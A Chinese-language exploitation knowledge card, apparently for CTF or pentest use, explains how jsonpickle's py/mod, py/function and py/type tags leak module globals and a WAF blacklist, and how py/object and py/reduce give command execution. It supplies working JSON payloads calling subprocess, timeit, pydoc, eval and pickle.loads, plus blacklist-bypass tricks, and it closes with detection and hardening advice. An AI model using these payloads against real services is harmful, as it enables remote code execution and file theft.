---
id: web-python-deserialization-jsonpickle-tag-surface-info-leak-rce
title: jsonpickle 标签面利用：py/mod、py/function、py/type 泄露模块全局与 WAF 黑名单，py/object 挑可调用对象直达 RCE
type: scenario
domain: web
path: web/python/deserialization
technique: jsonpickle-tag-surface-global-leak-callable-rce
aliases:
- jsonpickle 标签
- py/mod 泄露 __dict__
- py/function 读 __code__
- py/reduce 构造 __reduce__
- py/object 任意可调用对象
- safe=True 不代表安全
- jsonpickle 4.0.0
tags:
- web
- python
- jsonpickle
- deserialization
- info-leak
- waf-bypass
- rce
- token
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:28:11+08:00'
  notes: 已对照原文核对 loadclass/_loadmodule/_restore_reduce/_restore_repr/_restore_object 源码语义、safe=True 只影响 py/repr、三组信息泄露 payload、泄露出的 BLACKLIST 原文、以及 py/object 的 subprocess.run/timeit.main/pydoc.pipepager/glob.glob/linecache.getlines/pickle.loads+py/b64 与 py/reduce+builtins.eval 各条；本次核对未读取图片（标签处理函数表在截图中，未核）；修正两处：py/mod 语义补正（_loadmodule 丢弃 identifier 第一段，__main__/x.__dict__ 实际求值 __main__→__dict__）、glob.glob 的 newargs 由非法 JSON 集合写法改为数组并加注；未验证点：未在本机复跑 jsonpickle 4.0.0
---

## 一句话结论

`jsonpickle.decode(token, safe=True)` 的「安全」只作用于 `py/repr` 这一类需要 `eval` 的标签，`py/object`、`py/reduce`、`py/mod`、`py/function`、`py/type` 依然会把 JSON 里的类名/属性路径交给 `__import__` + `getattr` 递归解析，或把解析到的可调用对象直接执行。于是攻击者可以：先用 `{"py/mod":"__main__/x.__dict__"}`、`{"py/function":"__main__.__dict__"}` 把目标进程的模块全局变量（含 WAF 黑名单本身）读回到业务回显字段里，再挑一个够用的可调用对象（`subprocess.run`、`timeit.main`、`pydoc.pipepager`、`glob.glob`、`linecache.getlines`、`pickle.loads` 等）构造 `py/object`/`py/reduce` 完成命令执行或文件读取。

## 原理

- **restore 是「按标签反射」而不是「按类型还原」**：`decode()` 先用 JSON 后端把字符串变 dict，再交给 `Unpickler.restore`；`_restore_tags` 按 dict 里的键（`py/object`/`py/type`/`py/function`/`py/mod`/`py/reduce`/`py/repr`/`py/tuple`/`py/newargs`…）分派到处理函数。标签值里的字符串最终都会经 `loadclass()`/`_loadmodule()` 变成 Python 对象，因此「数据」可以指定任意可导入路径。
- **`loadclass` 的属性递归**：它把 `module_and_name` 按点号从后往前切，对每个候选模块 `__import__` 后逐段 `getattr`，失败回退一级。所以 `os.path.join`、`subprocess.run`、`timeit.main`、`pydoc.pipepager` 这类「模块+属性」都能被解析成真正的可调用对象；`__main__.x.__dict__` 这类路径还能一步取到模块/对象的 `__dict__`。
- **`py/mod` 的 `/` 语义**：`_loadmodule` 用 `module/identifier` 形式，`__import__(module)` 后对 `identifier.split('.')[1:]` 逐段 `getattr`——注意**它会丢掉 identifier 的第一个元素**，所以 `__main__/x.__dict__` 里的 `x` 只是占位符，真实求值链是 `__main__ → __dict__`，返回的是模块的 `__dict__`（因此能读出 `BLACKLIST`、`waf` 函数对象）；要取更深属性必须写成 `模块/占位.a.b.c` 这种多段形式（如 `__main__/x.waf.__code__`）。
- **`py/object` 的执行面**：`_restore_object` 先用 `loadclass` 拿 `cls`，再按 `py/newargsex`/`py/newargs`/`py/initargs` 恢复参数，尝试 `cls.__new__(cls, *args)`；若 `cls` 不是 type（普通函数）就走 `object.__new__` 失败分支，最后 `cls(*args)` ——即**直接调用该可调用对象**。这就是 `{"py/object":"subprocess.run","py/newargs":["calc"]}` 能执行命令的原因。
- **`py/reduce` 等价于 `__reduce__`**：值是一个可迭代对象，第一个元素是 callable（需先被 restore），第二个是 args 元组；`f` 若不是 `py/newobj`/`__newobj__` 就直接 `f(*args)`。配合 `{"py/function":"builtins.eval"}` + `{"py/tuple":["..."]}` 就是一次 `eval`。
- **`py/type`/`py/function` 的信息泄露价值**：`_restore_type`/`_restore_function` 都调用 `loadclass`，因此可以用它们把「任意已导入模块的属性」作为对象返回，业务再把它 `str()`/回显，就等于任意对象读取；把 `__dict__` 读出来还能拿到服务端的黑名单、密钥、函数对象（进而 `__code__.co_code` 反汇编）。
- **safe=True 的边界**：`self.safe` 只切换 `py/repr` 的恢复方式（`_restore_repr_safe` → `_loadmodule`；`safe=False` 才是 `loadrepr` 的 `eval`）。所以 `safe=True` 并没有关掉 `py/object`/`py/reduce` 的对象构造与调用面，官方也把「不要反序列化不可信数据」写进了文档。
- **为什么编码绕过在这条链上会失败**：`json` 后端 `loads` 接受 `str` 和 `bytes`，`bytes` 会按 BOM 探测 `utf-32/utf-16/utf-8-sig`；但若 WAF 先把 body 用 `json.loads` 解析再 `json.dumps(..., ensure_ascii=False)` 重写，编码层就被抹平成普通字符串，`\u0072\u0065...` 之类也会被解码成明文，因此「换编码藏关键字」只在 WAF 直接对原始 bytes 做字符串匹配时有效。

## 触发条件

- 应用把用户可控数据（Cookie、token、表单字段）交给 `jsonpickle.decode`，即使传了 `safe=True`；
- 解码结果会被使用或回显（如 `token.username` 被拼进响应、`token.timestamp` 参与比较），使「读到的对象」能反映到输出；
- WAF/黑名单在 decode 之前只做字符串匹配，且黑名单内容可从同进程的模块全局里读到（本例可通过回显 `__dict__` 拿到）；
- 目标进程能导入 `subprocess`/`timeit`/`pydoc`/`linecache`/`pickle` 等模块（标准库即满足）。

## 利用步骤

1. 抓包确认 token 形态：Base64 解码后是 `{"py/object":"__main__.Token","username":...,"timestamp":...}`，说明走 `jsonpickle` 且 `py/object` 可用。
2. 读模块全局：把 `username` 换成 `{"py/mod":"__main__/x.__dict__"}`，观察回显是否变成模块字典（含 `BLACKLIST`、`waf` 等键）；可换 `{"py/function":"__main__.__dict__"}`、`{"py/type":"__main__.__dict__"}` 交叉验证。
3. 从回显里抄出黑名单，确认哪些字符串（`os`、`popen`、`builtins`、`eval`、`exec`、`code` 等）会被拦。
4. 选择一个不在黑名单里的可调用对象：命令执行可用 `subprocess.run`/`subprocess.getoutput`/`timeit.main`/`pydoc.pipepager`/`uuid._get_command_stdout`；文件读取可用 `linecache.getlines`/`glob.glob`/`os.listdir`；需要原生 pickle 时用 `pickle.loads` + `py/b64`。
5. 用 `{"py/object":"<callable>","py/newargs":[<args>]}` 构造 payload，把结果塞进会被回显的字段（如 `username`），一次请求即可看到输出。
6. 若关键字仍被拦，改用 `py/reduce` + `py/function: builtins.eval` 把整条表达式放进元组参数，或把关键字拆成 `__dict__`/`getattr` 链从模块全局里取（如 `__main__/x.waf.__code__.co_code` 取字节码）。

## PoC

信息泄露（把回显字段换成标签对象）：

```json
{"py/object": "__main__.Token", "username": {"py/mod": "__main__/x.__dict__"}, "timestamp": 1733380109}
```

```json
{"py/mod": "__main__/x.__dict__"}
{"py/function": "__main__.__dict__"}
{"py/type": "__main__.__dict__"}
```

RCE / 文件读取（`py/object` 直接调用可调用对象）：

```json
{"py/object": "subprocess.run", "py/newargs": ["calc"]}
{"py/object": "subprocess.getoutput", "py/newargs": ["id"]}
{"py/object": "timeit.main", "py/newargs": [["-r", "1", "-n", "1", "__import__(\"os\").system(\"id\")"]]}
{"py/object": "pydoc.pipepager", "py/newargs": ["x", "id"]}
{"py/object": "glob.glob", "py/newargs": ["/*"]}
{"py/object": "linecache.getlines", "py/newargs": ["/flag"]}
```

注：原文该条写作 Python 集合字面量 `{'py/newargs': {'/*'}}`；真实发包时 body 必须是合法 JSON，故此处按数组 `["/*"]` 落地（`_restore_object` 只要求 args 能被 restore 成序列）。

等价 `py/reduce` 形式：

```json
{"py/reduce": [{"py/function": "builtins.eval"}, {"py/tuple": ["__import__('os').system('id')"]}]}
```

原生 pickle 组合（`py/b64` 承载序列化字节）：

```json
{"py/object": "pickle.loads", "py/newargs": [{"py/b64": "<base64 的 reduce 载荷>"}]}
```

`py/repr` 仅演示 `safe=False` 时的危险面（本题默认 safe，不可用）：

```json
{"py/repr": "os/os.system('calc')"}
```

## 变体与关联

- **变体（黑名单绕过）**：把关键字拆到 `py/mod` 路径段里（如用 `__main__` 里的已有变量代指）；或先用 `py/object` 调用 `dict.clear`/`list.clear` 清空黑名单（见关联卡）再发命令。
- **变体（编码绕过）**：当 WAF 直接对原始 body 做匹配且传入 `decode` 的是 bytes 时，用 `utf-32-be`/`utf-16-le` 写文件（带 BOM）后再发送，可使 `subprocess`/`os` 等关键字不出现在可见字节流里；若 WAF 会 `json.loads`+`json.dumps` 重写，则此路不通（`\u0072\u0065...` 也会被还原成明文）。
- **变体（盲打）**：无回显时用 `py/object` 调 `timeit`/`subprocess` 制造时间差或外带 DNS/HTTP；或用 `linecache.getlines` 把内容塞进会被写进日志的字段。
- **关联**：[[web-python-deserialization-jsonpickle-forbidden-list-clear-bypass]]（同库同 sink，但那条是「清空全局黑名单」的有状态绕过；本卡是「标签面信息泄露 + 可调用对象选择」）、[[web-python-deser-pyyaml-tag-directive-waf-bypass-linecache]]（同为「WAF 字符串匹配 vs 解析层语义不一致」）、[[web-python-deserialization-pickle-pydoc-pipepager-short-blacklist-bypass]]（`pydoc.pipepager` 作为短黑名单绕过元件）。

## 检测与防御

- **不要用 jsonpickle 解析不可信数据**：会话/令牌用 `itsdangerous` 签名、JWT 或服务端 session；必须用时设 `safe=True` + 显式 `classes=` 白名单，并在 decode 前拒绝任何含 `py/` 前缀键的输入（`py/object`、`py/reduce`、`py/function`、`py/mod`、`py/type`、`py/repr`、`py/b64`、`py/newargs`）。
- **别把「安全模式」当安全边界**：`safe=True` 只挡 `py/repr` 的 `eval`；文档明确要求对不可信数据做 HMAC 或改用标准 `json`。
- **检测点**：请求体/解码后字符串出现 `py/`、`__main__`、`__dict__`、`__code__`、`co_code`、`py/b64`、`py/reduce`；同一来源先请求「读全局/黑名单」再请求「执行命令」，是典型两阶段；进程侧监控 Web 进程派生子进程（`subprocess`/`os.system`）与异常文件读取。
- **加固**：Web 进程最小权限、`/flag` 之类敏感文件不对其可读；禁用/审计 `subprocess`、`timeit`、`pydoc`、`pickle` 在请求路径上的可达性；WAF 做结构解析（递归拒绝 `py/*` 键）而非字符串黑名单，且规则表不可被请求修改。
